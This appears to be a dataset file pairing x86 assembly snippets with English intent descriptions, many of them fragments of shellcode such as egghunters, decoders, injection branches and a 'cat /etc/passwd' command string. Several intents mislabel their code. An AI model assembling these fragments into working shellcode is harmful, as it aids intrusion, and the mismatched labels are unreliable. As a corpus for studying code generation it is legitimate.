SNIPPETS	INTENTS
add eax, esi	add the contents of the esi register to the contents of eax register
add ebp, 0x2	add 0x2 to the contents of ebp
add ebx, 0x2	add 0x2 to the contents in ebx and save the result in ebx
add ebx, 16	add 16 to ebx
add ebx, 2	add 2 to the contents of the ebx register
add ebx, 2	add decimal integer 2 to ebx
add ebx, 24	add 48 to ebx
add ebx, 3	add 3 to the contents of the ebx register
add ebx, 5	add decimal integer 5 to ebx
add ebx, ecx	add ecx to ebx
add ecx, 1	add the value 1 into the ecx register
add ecx, 16	add 16 to ecx
add ecx, ebx	add ebx to ecx
add edi, edi	add the contents of edi to the contents of edi
add edi, edi	add the contents of the edi register to the contents of edi register
add edx, 16	set edx to next 16 byte block
add edx, 32	add 32 to edx
add edx, 48	add 48 to edx
add edx, 64	add 64 to the contents of the edx register
add edx, eax	add the contents of eax to the contents of edx
add edx, eax	add the contents of the eax register to the contents of edx register
add edx, eax	add the contents of the eax register to the edx register
add edx, ecx	add ecx to edx
add esi, 0x21354523	add 0x21354523 to the contents in esi and save the result in esi
add esi, 0x21354523	add 0x21354523 to the contents of esi
add esi, 0x30	add 0x30 to esi
add esi, 0x33333333	add 0x33333333 value to esi
add esi, 0x3f3f3f3f	add 0x3f3f3f3f to the contents in esi and save the result in esi
add esi, 4	add 4 to esi
add esi, 4	add 4 to the contents of the esi register
add esi, eax	add eax to esi
add esi, eax	add the contents of the eax register to the contents of esi register
add esp, 0x20	add 0x20 to the contents in esp and save the result in esp
add esp, 3	add 3 to the contents of esp
add esp, 3	add 3 to the contents of the esp register
add esp, 4	add 4 to the esp register
add marks, 10	add 10 to the variable marks
addr: db 0x1	define the byte addr and initialize it to 0x1
all:	define the all label
an_integer dd 12425	define the doubleword an_integer and initialize it to 12425
and al, 0fh	perform a logical and operation between the al register and the 0fh value and store the result in the al register
and ax, 1	perform logical and between ax and 1
and eax, 0000000fh	mask out lowest 4 bits of the eax register
and eax, 0fh	clear all but the last 4 bits of eax
and eax, 3f465456	perform and operation between eax and 3f465456 and save the result in eax
and eax, 40392b29	perform and operation between eax and 40392b29 and save the result in eax
and ebx, 0000000fh	mask out lowest 4 bits of the ebx register
and ecx, 0000000fh	mask out lowest 4 bits of the ecx register
and edx, 0000000fh	mask out lowest 4 bits of the edx register
and mask1, 128	perform and operation on the variable mask1 and 128
arr dd 100	define the doubleword arr and initialize it to 100
arr dd 50	define the doubleword arr and initialize it to 50
arr1 resb 400	reserve the array arr1 of 400 uninitialized bytes
array dd 20	define the doubleword arr and initialize it to 20
array word 20	define an array of 20 initialized word
array word 5	define an array of 5 initialized word
b: dd 0x0	create variable b in memory and initialize to zero
big_number dd 123456789	define the doubleword variable big_number and initialize it to 123456789
bignum: resw 1	reserve 1 word at location bignum
buffer: resb 64	reserve 64 bytes for buffer
buffersize: dw 1024	declare buffersize to be a word containing 1024
byte_table db 14, 15, 22, 45	define a tables of bytes byte_table and initialize to 14, 15 and 22
byte_value db 150	define the byte value byte_value and initialize it to 150
bytes db 10	define the byte value bytes and initialize it to 10
bytes db 20	define the byte value bytes and initialize it to 20
call _appendfile	call the _appendfile function
call _build	call the _build function
call _continue	call _continue
call _continue	call the _continue function
call _exec	call the _exec function
call _exit	call _exit
call _malloc	call _malloc
call _myfunc	call the _myfunc function
call _params	call the _params function
call _printf	call the _printf function
call _write	call the _write function
call [esp]	call the function in esp
call atoi	call the atoi function
call code	call the code function
call cont	call the cont function
call decoder	call the decoder function
call doit	call the doit function
call egghunter	call the egghunter function
call esi	call the esi function
call esi	call the function in esi
call esp	call the esp function
call execute	call the execute function
call internetreadfile	call function internetreadfile
call iprint	call the iprint function
call iprintlf	call the iprintlf function
call jmp_search	call jmp_search
call jmp_search	call the jmp_search function
call loader	call the loader function
call main	call the main function
call me	call the me function
call my_subroutine	call my_subroutine
call near stageaddress	call the near function
call one	call the one function
call prepare	call the prepare function
call quit	call the quit function
call set_argv	call set_argv
call set_argv	call the set_argv function
call shell_ret	call the shell_ret function
call shellcode	call the shellcode function
call sprint	call the sprint function
call sprintlf	call the sprintlf function
call start	call the start function
call strlen	call the strlen function
call two	call the two function
call write	call the write function
call writestring	call the writestring function
call writestring	call writestring
call_decoded:	define the call_decoded label
call_decoder:	define call_decoder function
call_decoder:	define the call_decoder label
call_egghunter:	define the call_egghunter label
call_shellcode:	declare the call_shellcode label
call_shellcode:	define call_shellcode function
call_shellcode:	define call_shellcode label
call_shellcode:	define the call_shellcode label
call_write:	define the call_write label
callit:	define the callit label
callme:	define the callme label
callpop:	define the callpop function
callpop:	define the callpop label
cdq	clear the edx register
cdq	extend the sign bit of eax into the edx register
cdq	extend the sign bit of eax register into the edx register
cdq	extend the sign bit of the eax register into the edx register
check_even_odd:	define check_even_odd function
child:	define the child function
child:	define the child label
chmod_call equ 15	define chmod_call equal to 15
choice db 'y'	define variable choice of 1 byte and initialize to y
cld	clear the direction flag
cld	direction flag equal to zero
cld	set the direction flag to zero
close_syscall equ 6	define close_syscall equal to 6
closefile:	define the closefile function
closefile:	define the closefile label
cmd:	define the cmd label
cmd: db 'cat /etc/passwd'	declare cmd string and initialize it to 'cat /etc/passwd'
cmd: db 'cat /etc/passwd'	define cmd as the byte string 'cat /etc/passwd'
cmp [ebp+arg_0], 1	compare the contents stored at ebp+arg_0 with 1
cmp [ebp+var_a], 0	compare if the contents at memory location ebp+var_a is 0
cmp [ebp+var_a], 0	compare the contents at memory location ebp+var_a with 0
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5
cmp [esi], edx	compare the contents at memory location esi and the contents of the edx register
cmp [esi], edx	compare the contents at memory location esi with edx
cmp al, 0x38 \n je 0x40 \n push byte 0x1	jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack
cmp al, 0x38 \n je 0x40 \n push byte 0x1	if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
cmp al, 0xaa \n je decode_insertion \n xor al, bl	jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xaa \n je decode_insertion \n xor al, bl	if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xf2	compare if the contents of al with 0xf2
cmp al, 0xf2	compare the contents of the al register and 0xf2
cmp al, 0xf2	compare the contents of the al register with the value 0xf2
cmp al, 0xf2 \n je _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je fillOnes	jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je fillOnes	if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je next_page	jump to the label next_page if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je next_page	if the contents of the al register is equal to the value 0xf2 then jump to the label next_page
cmp al, 0xf2 \n jz _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n jz incpage	jump to the incpage label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz incpage	if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
cmp al, 9 \n jg l1	jump to the label l1 if the contents of the al register is greater than the decimal value 9
cmp al, 9 \n jg l1	if the contents of the al register is greater than the decimal value 9 then jump to the label l1
cmp al, 9 \n jge l1	jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
cmp al, 9 \n jge l1	if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1
cmp al, bl \n ja l2 \n add eax, 3	jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register
cmp al, bl \n ja l2 \n add eax, 3	if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register
cmp al, bl \n jb l2	jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register
cmp al, bl \n jb l2	if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2
cmp al, cl	compare the contents of al with the cl register
cmp al, cl	compare the contents of the al register and the contents of the cl register
cmp al, cl \n jne short decode \n jmp shellcode	jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label
cmp al, cl \n jne short decode \n jmp shellcode	if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label
cmp ax, bx \n jne l3	jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register
cmp ax, bx \n jne l3	if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label
cmp ax, bx \n jne l3 \n jmp while	jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label
cmp ax, bx \n jne l3 \n jmp while	if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
cmp bh, al	compare the contents of bh and the contents of al
cmp bl, 0x1f	compare the contents of bl and 0x1f
cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40	jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40	if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register
cmp bl, 0xaa \n je shellcode	jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
cmp bl, 0xaa \n je shellcode	if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label
cmp bl, 0xbb \n je xordecode \n jmp notdecode	jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label
cmp bl, 0xbb \n je xordecode \n jmp notdecode	if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label
cmp bl, 48	compare ebx register's lower half value against ascii value 48
cmp bl, 57	compare ebx register's lower half value against ascii value 57
cmp bl, 78h \n jg short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h
cmp bl, 78h \n jg short loc_402B1D	if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jge short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h
cmp bl, 78h \n jge short loc_402B1D	if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jl short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h
cmp bl, 78h \n jl short loc_402B1D	if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jle short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h
cmp bl, 78h \n jle short loc_402B1D	if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
cmp bl, al \n je loop_2	jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register
cmp bl, al \n je loop_2	if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
cmp bl, al \n je loop_2 \n jmp short not_found	jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label
cmp bl, al \n je loop_2 \n jmp short not_found	if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label
cmp byte [buff], 61h	compare the byte at the memory location buff with 61h
cmp byte [buff], 7ah	compare the byte at the memory location buff with 7ah
cmp byte [eax], 0	compare the byte pointed to by eax at this address against zero
cmp byte [ebp+ecx], 61h	compare the byte at the memory location ebp+ecx with 61h
cmp byte [ebp+ecx], 7ah	compare the byte at the memory location ebp+ecx with 7ah
cmp BYTE [edx], 0x2e \n jne l2	jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e
cmp BYTE [edx], 0x2e \n jne l2	if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label
cmp BYTE [edx], 0x2e \n jne l2 \n jmp while	jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
cmp BYTE [edx], 0x2e \n jne l2 \n jmp while	if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label
cmp byte [esi], 0x7	compare the byte in esi with 0x7
cmp BYTE [esi], 0x7 \n jl lowbound	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7
cmp BYTE [esi], 0x7 \n jl lowbound	if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label
cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register
cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7	if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
cmp BYTE [esi], 0x7 \n jle lowbound	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7
cmp BYTE [esi], 0x7 \n jle lowbound	if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label
cmp byte [esi], 0xd	compare the byte at the address esi and 0xd
cmp byte [esi], 0xD \n jl wrap_around	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD
cmp byte [esi], 0xD \n jl wrap_around	if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label
cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register
cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD	if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
cmp byte [esi], 0xD \n jle wrap_around	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
cmp byte [esi], 0xD \n jle wrap_around	if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label
cmp BYTE al, 2 \n je do_inject	jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register
cmp BYTE al, 2 \n je do_inject	if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject
cmp BYTE al, 2 \n je do_inject \n jmp while	jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
cmp BYTE al, 2 \n je do_inject \n jmp while	if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject
cmp BYTE bl, [esi] \n jne loop_1	jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register
cmp BYTE bl, [esi] \n jne loop_1	if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1
cmp cl, 0x11 \n jb 0xff \n add dl, 0x5	jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register
cmp cl, 0x11 \n jb 0xff \n add dl, 0x5	if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register
cmp cl, 0x3 \n jne loop	jump to the loop label if the contents of the cl register is not equal to the value 0x3
cmp cl, 0x3 \n jne loop	if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
cmp cl, 0x3 \n jne loop2	jump to the loop2 label if the contents of the cl register is not equal to the value 0x3
cmp cl, 0x3 \n jne loop2	if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label
cmp cl, 12 \n jg l2	jump to the label l2 if the contents of the cl register is greater than the decimal value 12
cmp cl, 12 \n jg l2	if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
cmp cl, 12 \n jge l2	jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12
cmp cl, 12 \n jge l2	if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2
cmp cl, dl \n jb l3	jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
cmp cl, dl \n jb l3	if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3
cmp cl, dl \n je EncodedShellcode	jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register
cmp cl, dl \n je EncodedShellcode	if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label
cmp cl, dl \n je init \n inc cl	jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register
cmp cl, dl \n je init \n inc cl	if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
cmp dl, 1 \n je exit \n jmp reading	jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
cmp dl, 1 \n je exit \n jmp reading	if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label
cmp dl, 1h	compare the contents of the dl register and 1h
cmp dl, 27 \n jg l3	jump to the label l3 if the contents of the dl register is greater than the decimal value 27
cmp dl, 27 \n jg l3	if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
cmp dl, 27 \n jge l3	jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
cmp dl, 27 \n jge l3	if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3
cmp dl, cl \n jb l1 \n mov al, 0x39	jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register
cmp dl, cl \n jb l1 \n mov al, 0x39	if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register
cmp dword [eax-4], egg1	compare the dword at the address [eax-4] and egg1
cmp dword [eax-4], egg1 \n jne _next \n jmp eax	jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register
cmp dword [eax-4], egg1 \n jne _next \n jmp eax	if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
cmp dword [eax-4], egg2 \n je _next \n jmp eax	jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
cmp dword [eax-4], egg2 \n je _next \n jmp eax	if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register
cmp dword [eax-4],egg1	compare the dword at the memory location [eax-4] with the value of egg1
cmp dword [eax-8], egg	compare the dword at the address [eax-8] and egg
cmp dword [eax-8], egg \n jne _next	jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address
cmp dword [eax-8], egg \n jne _next	if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
cmp dword [eax-8],egg	compare the dword at the memory location [eax-8] with the value of egg
cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax	jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register
cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
cmp dword [eax], ebx	compare the dword at the address [eax] and the contents of the ebx register
cmp dword [eax], ebx \n jne next_addr \n jmp eax	jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register
cmp dword [eax], ebx \n jne next_addr \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register
cmp DWORD [eax], edx \n jne loop \n jmp eax	jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne loop \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
cmp DWORD [edx], 0x636f7270 \n je while	jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
cmp DWORD [edx], 0x636f7270 \n je while	if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label
cmp dword [var], 10	compare the doubleword stored at memory location var to the integer value 10
cmp dx, 00	compare the dx value with zero
cmp dx, 0x03e8 \n je L1	jump to the L1 label if the contents of the dx register is equal to the value 0x03e8
cmp dx, 0x03e8 \n je L1	if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label
cmp eax, 0	compare eax to zero
cmp eax, 0	compare if eax is equal to 0
cmp eax, 0	compare if eax is zero
cmp eax, eax	compare the contents of eax and the contents of eax
cmp eax, eax \n jne 0x8	jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register
cmp eax, eax \n jne 0x8	if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8
cmp eax, eax \n jne 0x8 \n xor eax, eax	jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register
cmp eax, eax \n jne 0x8 \n xor eax, eax	if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
cmp eax, ebp \n jnz short loc_40102B	jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register
cmp eax, ebp \n jnz short loc_40102B	if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
cmp eax, ebx	compare eax with ebx
cmp eax, ebx	compare the contents of eax and the contents of ebx
cmp eax, ebx	compare the contents of the eax register and the contents of the ebx register
cmp eax, ebx \n je 0x47	jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
cmp eax, ebx \n je 0x47	if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47
cmp eax, ebx \n je 0x47 \n xor ecx, ecx	jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
cmp eax, ebx \n je 0x47 \n xor ecx, ecx	if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
cmp eax, ebx \n je all	jump to the all label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je all	if the contents of the eax register is equal to the contents of the ebx register then jump to the all label
cmp eax, ebx \n je all \n xor eax, eax	jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
cmp eax, ebx \n je all \n xor eax, eax	if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register
cmp eax, ebx \n je child	jump to the child label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je child	if the contents of the eax register is equal to the contents of the ebx register then jump to the child label
cmp eax, ebx \n je connect \n ja exit	jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
cmp eax, ebx \n je connect \n ja exit	if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
cmp eax, ebx \n je download	jump to the download label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je download	if the contents of the eax register is equal to the contents of the ebx register then jump to the download label
